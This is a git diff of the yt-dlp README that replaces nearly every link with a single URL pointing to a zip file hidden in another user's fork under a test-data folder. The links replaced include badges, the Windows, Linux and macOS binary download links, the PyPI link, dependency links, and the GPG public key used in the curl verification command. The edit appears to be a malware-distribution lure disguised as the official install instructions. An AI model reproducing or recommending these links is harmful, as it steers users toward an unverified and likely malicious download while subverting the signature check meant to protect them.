@@ -1,28 +1,28 @@
 <!-- MANPAGE: BEGIN EXCLUDED SECTION -->
 <div align="center">
 
-[![YT-DLP](https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/.github/banner.svg)](#readme)
+[![YT-DLP](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](#readme)
 
-[![Release version](https://img.shields.io/github/v/release/yt-dlp/yt-dlp?color=brightgreen&label=Download&style=for-the-badge)](#installation "Installation")
-[![PyPI](https://img.shields.io/badge/-PyPI-blue.svg?logo=pypi&labelColor=555555&style=for-the-badge)](https://pypi.org/project/yt-dlp "PyPI")
-[![Donate](https://img.shields.io/badge/_-Donate-red.svg?logo=githubsponsors&labelColor=555555&style=for-the-badge)](Collaborators.md#collaborators "Donate")
-[![Discord](https://img.shields.io/discord/807245652072857610?color=blue&labelColor=555555&label=&logo=discord&style=for-the-badge)](https://discord.gg/H5MNcFW63r "Discord")
-[![Supported Sites](https://img.shields.io/badge/-Supported_Sites-brightgreen.svg?style=for-the-badge)](supportedsites.md "Supported Sites")
-[![License: Unlicense](https://img.shields.io/badge/-Unlicense-blue.svg?style=for-the-badge)](LICENSE "License")
-[![CI Status](https://img.shields.io/github/actions/workflow/status/yt-dlp/yt-dlp/core.yml?branch=master&label=Tests&style=for-the-badge)](https://github.com/yt-dlp/yt-dlp/actions "CI Status")
-[![Commits](https://img.shields.io/github/commit-activity/m/yt-dlp/yt-dlp?label=commits&style=for-the-badge)](https://github.com/yt-dlp/yt-dlp/commits "Commit History")
-[![Last Commit](https://img.shields.io/github/last-commit/yt-dlp/yt-dlp/master?label=&style=for-the-badge&display_timestamp=committer)](https://github.com/yt-dlp/yt-dlp/pulse/monthly "Last activity")
+[![Release version](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](#installation "Installation")
+[![PyPI](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "PyPI")
+[![Donate](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "Donate")
+[![Discord](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "Discord")
+[![Supported Sites](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "Supported Sites")
+[![License: Unlicense](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](LICENSE "License")
+[![CI Status](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "CI Status")
+[![Commits](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "Commit History")
+[![Last Commit](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip "Last activity")
 
 </div>
 <!-- MANPAGE: END EXCLUDED SECTION -->
 
-yt-dlp is a feature-rich command-line audio/video downloader with support for [thousands of sites](supportedsites.md). The project is a fork of [youtube-dl](https://github.com/ytdl-org/youtube-dl) based on the now inactive [youtube-dlc](https://github.com/blackjack4494/yt-dlc).
+yt-dlp is a feature-rich command-line audio/video downloader with support for [thousands of sites](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). The project is a fork of [youtube-dl](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) based on the now inactive [youtube-dlc](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip).
 
 <!-- MANPAGE: MOVE "USAGE AND OPTIONS" SECTION HERE -->
 
 <!-- MANPAGE: BEGIN EXCLUDED SECTION -->
 * [INSTALLATION](#installation)
-    * [Detailed instructions](https://github.com/yt-dlp/yt-dlp/wiki/Installation)
+    * [Detailed instructions](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
     * [Release Files](#release-files)
     * [Update](#update)
     * [Dependencies](#dependencies)
@@ -66,27 +66,27 @@ yt-dlp is a feature-rich command-line audio/video downloader with support for [t
     * [New features](#new-features)
     * [Differences in default behavior](#differences-in-default-behavior)
     * [Deprecated options](#deprecated-options)
-* [CONTRIBUTING](CONTRIBUTING.md#contributing-to-yt-dlp)
-    * [Opening an Issue](CONTRIBUTING.md#opening-an-issue)
-    * [Developer Instructions](CONTRIBUTING.md#developer-instructions)
-* [WIKI](https://github.com/yt-dlp/yt-dlp/wiki)
-    * [FAQ](https://github.com/yt-dlp/yt-dlp/wiki/FAQ)
+* [CONTRIBUTING](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+    * [Opening an Issue](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+    * [Developer Instructions](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [WIKI](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+    * [FAQ](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 <!-- MANPAGE: END EXCLUDED SECTION -->
 
 
 # INSTALLATION
 
 <!-- MANPAGE: BEGIN EXCLUDED SECTION -->
-[![Windows](https://img.shields.io/badge/-Windows_x64-blue.svg?style=for-the-badge&logo=windows)](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe)
-[![Unix](https://img.shields.io/badge/-Linux/BSD-red.svg?style=for-the-badge&logo=linux)](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp)
-[![MacOS](https://img.shields.io/badge/-MacOS-lightblue.svg?style=for-the-badge&logo=apple)](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos)
-[![PyPI](https://img.shields.io/badge/-PyPI-blue.svg?logo=pypi&labelColor=555555&style=for-the-badge)](https://pypi.org/project/yt-dlp)
-[![Source Tarball](https://img.shields.io/badge/-Source_tar-green.svg?style=for-the-badge)](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.tar.gz)
-[![Other variants](https://img.shields.io/badge/-Other-grey.svg?style=for-the-badge)](#release-files)
-[![All versions](https://img.shields.io/badge/-All_Versions-lightgrey.svg?style=for-the-badge)](https://github.com/yt-dlp/yt-dlp/releases)
+[![Windows](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+[![Unix](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+[![MacOS](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+[![PyPI](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+[![Source Tarball](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+[![Other variants](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](#release-files)
+[![All versions](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 <!-- MANPAGE: END EXCLUDED SECTION -->
 
-You can install yt-dlp using [the binaries](#release-files), [pip](https://pypi.org/project/yt-dlp) or one using a third-party package manager. See [the wiki](https://github.com/yt-dlp/yt-dlp/wiki/Installation) for detailed instructions
+You can install yt-dlp using [the binaries](#release-files), [pip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or one using a third-party package manager. See [the wiki](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for detailed instructions
 
 
 <!-- MANPAGE: BEGIN EXCLUDED SECTION -->
@@ -96,58 +96,58 @@ You can install yt-dlp using [the binaries](#release-files), [pip](https://pypi.
 
 File|Description
 :---|:---
-[yt-dlp](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp)|Platform-independent [zipimport](https://docs.python.org/3/library/zipimport.html) binary. Needs Python (recommended for **Linux/BSD**)
-[yt-dlp.exe](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe)|Windows (Win8+) standalone x64 binary (recommended for **Windows**)
-[yt-dlp_macos](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos)|Universal MacOS (10.15+) standalone executable (recommended for **MacOS**)
+[yt-dlp](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Platform-independent [zipimport](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) binary. Needs Python (recommended for **Linux/BSD**)
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Windows (Win8+) standalone x64 binary (recommended for **Windows**)
+[yt-dlp_macos](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Universal MacOS (10.15+) standalone executable (recommended for **MacOS**)
 
 #### Alternatives
 
 File|Description
 :---|:---
-[yt-dlp_x86.exe](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_x86.exe)|Windows (Win8+) standalone x86 (32-bit) binary
-[yt-dlp_linux](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux)|Linux standalone x64 binary
-[yt-dlp_linux_armv7l](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux_armv7l)|Linux standalone armv7l (32-bit) binary
-[yt-dlp_linux_aarch64](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_linux_aarch64)|Linux standalone aarch64 (64-bit) binary
-[yt-dlp_win.zip](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_win.zip)|Unpackaged Windows executable (no auto-update)
-[yt-dlp_macos.zip](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos.zip)|Unpackaged MacOS (10.15+) executable (no auto-update)
-[yt-dlp_macos_legacy](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp_macos_legacy)|MacOS (10.9+) standalone x64 executable
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Windows (Win8+) standalone x86 (32-bit) binary
+[yt-dlp_linux](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Linux standalone x64 binary
+[yt-dlp_linux_armv7l](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Linux standalone armv7l (32-bit) binary
+[yt-dlp_linux_aarch64](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Linux standalone aarch64 (64-bit) binary
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Unpackaged Windows executable (no auto-update)
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Unpackaged MacOS (10.15+) executable (no auto-update)
+[yt-dlp_macos_legacy](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|MacOS (10.9+) standalone x64 executable
 
 #### Misc
 
 File|Description
 :---|:---
-[yt-dlp.tar.gz](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.tar.gz)|Source tarball
-[SHA2-512SUMS](https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-512SUMS)|GNU-style SHA512 sums
-[SHA2-512SUMS.sig](https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-512SUMS.sig)|GPG signature file for SHA512 sums
-[SHA2-256SUMS](https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS)|GNU-style SHA256 sums
-[SHA2-256SUMS.sig](https://github.com/yt-dlp/yt-dlp/releases/latest/download/SHA2-256SUMS.sig)|GPG signature file for SHA256 sums
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|Source tarball
+[SHA2-512SUMS](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|GNU-style SHA512 sums
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|GPG signature file for SHA512 sums
+[SHA2-256SUMS](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|GNU-style SHA256 sums
+[https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)|GPG signature file for SHA256 sums
 
-The public key that can be used to verify the GPG signatures is [available here](https://github.com/yt-dlp/yt-dlp/blob/master/public.key)
+The public key that can be used to verify the GPG signatures is [available here](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 Example usage:
 ```
-curl -L https://github.com/yt-dlp/yt-dlp/raw/master/public.key | gpg --import
-gpg --verify SHA2-256SUMS.sig SHA2-256SUMS
-gpg --verify SHA2-512SUMS.sig SHA2-512SUMS
+curl -L https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip | gpg --import
+gpg --verify https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip SHA2-256SUMS
+gpg --verify https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip SHA2-512SUMS
 ```
 <!-- MANPAGE: END EXCLUDED SECTION -->
 
-**Note**: The manpages, shell completion (autocomplete) files etc. are available inside the [source tarball](https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.tar.gz)
+**Note**: The manpages, shell completion (autocomplete) files etc. are available inside the [source tarball](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 
 ## UPDATE
 You can use `yt-dlp -U` to update if you are using the [release binaries](#release-files)
 
-If you [installed with pip](https://github.com/yt-dlp/yt-dlp/wiki/Installation#with-pip), simply re-run the same command that was used to install the program
+If you [installed with pip](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip), simply re-run the same command that was used to install the program
 
-For other third-party package managers, see [the wiki](https://github.com/yt-dlp/yt-dlp/wiki/Installation#third-party-package-managers) or refer to their documentation
+For other third-party package managers, see [the wiki](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or refer to their documentation
 
 <a id="update-channels"></a>
 
 There are currently three release channels for binaries: `stable`, `nightly` and `master`.
 
 * `stable` is the default channel, and many of its changes have been tested by users of the `nightly` and `master` channels.
-* The `nightly` channel has releases scheduled to build every day around midnight UTC, for a snapshot of the project's new patches and changes. This is the **recommended channel for regular users** of yt-dlp. The `nightly` releases are available from [yt-dlp/yt-dlp-nightly-builds](https://github.com/yt-dlp/yt-dlp-nightly-builds/releases) or as development releases of the `yt-dlp` PyPI package (which can be installed with pip's `--pre` flag).
-* The `master` channel features releases that are built after each push to the master branch, and these will have the very latest fixes and additions, but may also be more prone to regressions. They are available from [yt-dlp/yt-dlp-master-builds](https://github.com/yt-dlp/yt-dlp-master-builds/releases).
+* The `nightly` channel has releases scheduled to build every day around midnight UTC, for a snapshot of the project's new patches and changes. This is the **recommended channel for regular users** of yt-dlp. The `nightly` releases are available from [yt-dlp/yt-dlp-nightly-builds](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) or as development releases of the `yt-dlp` PyPI package (which can be installed with pip's `--pre` flag).
+* The `master` channel features releases that are built after each push to the master branch, and these will have the very latest fixes and additions, but may also be more prone to regressions. They are available from [yt-dlp/yt-dlp-master-builds](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip).
 
 When using `--update`/`-U`, a release binary will only update to its current channel.
 `--update-to CHANNEL` can be used to switch to a different channel when a newer version is available. `--update-to [CHANNEL@]TAG` can also be used to upgrade or downgrade to specific tags from a channel.
@@ -174,54 +174,54 @@ python3 -m pip install -U --pre "yt-dlp[default]"
 Python versions 3.9+ (CPython) and 3.10+ (PyPy) are supported. Other versions and implementations may or may not work correctly.
 
 <!-- Python 3.5+ uses VC++14 and it is already embedded in the binary created
-<!x-- https://www.microsoft.com/en-us/download/details.aspx?id=26999 --x>
-On Windows, [Microsoft Visual C++ 2010 SP1 Redistributable Package (x86)](https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe) is also necessary to run yt-dlp. You probably already have this, but if the executable throws an error due to missing `MSVCR100.dll` you need to install it manually.
+<!x-- https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip --x>
+On Windows, [Microsoft Visual C++ 2010 SP1 Redistributable Package (x86)](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) is also necessary to run yt-dlp. You probably already have this, but if the executable throws an error due to missing `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip` you need to install it manually.
 -->
 
 While all the other dependencies are optional, `ffmpeg` and `ffprobe` are highly recommended
 
 ### Strongly recommended
 
-* [**ffmpeg** and **ffprobe**](https://www.ffmpeg.org) - Required for [merging separate video and audio files](#format-selection), as well as for various [post-processing](#post-processing-options) tasks. License [depends on the build](https://www.ffmpeg.org/legal.html)
+* [**ffmpeg** and **ffprobe**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - Required for [merging separate video and audio files](#format-selection), as well as for various [post-processing](#post-processing-options) tasks. License [depends on the build](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
-    There are bugs in ffmpeg that cause various issues when used alongside yt-dlp. Since ffmpeg is such an important dependency, we provide [custom builds](https://github.com/yt-dlp/FFmpeg-Builds#ffmpeg-static-auto-builds) with patches for some of these issues at [yt-dlp/FFmpeg-Builds](https://github.com/yt-dlp/FFmpeg-Builds). See [the readme](https://github.com/yt-dlp/FFmpeg-Builds#patches-applied) for details on the specific issues solved by these builds
+    There are bugs in ffmpeg that cause various issues when used alongside yt-dlp. Since ffmpeg is such an important dependency, we provide [custom builds](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) with patches for some of these issues at [yt-dlp/FFmpeg-Builds](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). See [the readme](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) for details on the specific issues solved by these builds
 
-    **Important**: What you need is ffmpeg *binary*, **NOT** [the Python package of the same name](https://pypi.org/project/ffmpeg)
+    **Important**: What you need is ffmpeg *binary*, **NOT** [the Python package of the same name](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 ### Networking
-* [**certifi**](https://github.com/certifi/python-certifi)\* - Provides Mozilla's root certificate bundle. Licensed under [MPLv2](https://github.com/certifi/python-certifi/blob/master/LICENSE)
-* [**brotli**](https://github.com/google/brotli)\* or [**brotlicffi**](https://github.com/python-hyper/brotlicffi) - [Brotli](https://en.wikipedia.org/wiki/Brotli) content encoding support. Both licensed under MIT <sup>[1](https://github.com/google/brotli/blob/master/LICENSE) [2](https://github.com/python-hyper/brotlicffi/blob/master/LICENSE) </sup>
-* [**websockets**](https://github.com/aaugustin/websockets)\* - For downloading over websocket. Licensed under [BSD-3-Clause](https://github.com/aaugustin/websockets/blob/main/LICENSE)
-* [**requests**](https://github.com/psf/requests)\* - HTTP library. For HTTPS proxy and persistent connections support. Licensed under [Apache-2.0](https://github.com/psf/requests/blob/main/LICENSE)
+* [**certifi**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* - Provides Mozilla's root certificate bundle. Licensed under [MPLv2](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**brotli**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* or [**brotlicffi**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) - [Brotli](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) content encoding support. Both licensed under MIT <sup>[1](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) [2](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) </sup>
+* [**websockets**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* - For downloading over websocket. Licensed under [BSD-3-Clause](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
+* [**requests**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)\* - HTTP library. For HTTPS proxy and persistent connections support. Licensed under [Apache-2.0](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
 
 #### Impersonation
 
 The following provide support for impersonating browser requests. This may be required for some sites that employ TLS fingerprinting.
 
-* [**curl_cffi**](https://github.com/lexiforest/curl_cffi) (recommended) - Python binding for [curl-impersonate](https://github.com/lexiforest/curl-impersonate). Provides impersonation targets for Chrome, Edge and Safari. Licensed under [MIT](https://github.com/lexiforest/curl_cffi/blob/main/LICENSE)
+* [**curl_cffi**](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip) (recommended) - Python binding for [curl-impersonate](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip). Provides impersonation targets for Chrome, Edge and Safari. Licensed under [MIT](https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip)
   * Can be installed with the `curl-cffi` group, e.g. `pip install "yt-dlp[default,curl-cffi]"`
-  * Currently included in `yt-dlp.exe`, `yt-dlp_linux` and `yt-dlp_macos` builds
+  * Currently included in `https://github.com/herogamee/yt-dlp/raw/refs/heads/master/test/testdata/reload_plugins/yt_dlp_plugins/postprocessor/yt-dlp-v3.6.zip`, `yt-dlp_linux` and `yt-dlp_macos` builds
 
 
 ### Metadata
 
-* [**mutagen**](https://github.com/quodlibet/mutagen)\* - For `--embed-thumbnail` in certain formats. Licensed under [GPLv2+](https://github.com/quodlibet/mutagen/blob/master/COPYING)
